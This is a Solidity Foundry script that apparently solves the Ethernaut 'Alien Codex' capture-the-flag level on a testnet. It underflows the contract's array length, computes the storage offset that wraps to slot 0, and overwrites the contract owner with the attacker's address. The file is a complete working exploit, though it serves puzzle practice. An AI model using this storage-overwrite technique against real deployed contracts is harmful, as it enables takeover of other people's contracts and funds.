// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import {IAlienCodex} from "src/hack/interfaces/IAlienCodex.sol";

contract ALienCodexScript is Script {
    function run() external {
        address attacker = vm.rememberKey(vm.envUint("TESTNET_PRIVATE_KEY_1"));
        address alienCodexAddress = vm.envAddress("ALIEN_CODEX_ADDRESS");
        IAlienCodex alienCodex = IAlienCodex(alienCodexAddress);
        alienCodex.makeContact();
        alienCodex.retract();
        uint256 codexArraySlot = 1;
        uint256 codexBeginLocation = uint256(
            keccak256(abi.encode(codexArraySlot))
        );

        uint256 ownerOffset;
        unchecked {
            ownerOffset = (2 ** 256) - 1 - codexBeginLocation + 1;
        }
        console2.log("Owner Before Hack :", alienCodex.owner());

        vm.broadcast(attacker);
        alienCodex.revise(ownerOffset, bytes32(uint256(uint160(attacker))));

        console2.log("Owner After Hack :", alienCodex.owner());

        console2.log("SUCCESS!!! Submit the instance.");
    }
}
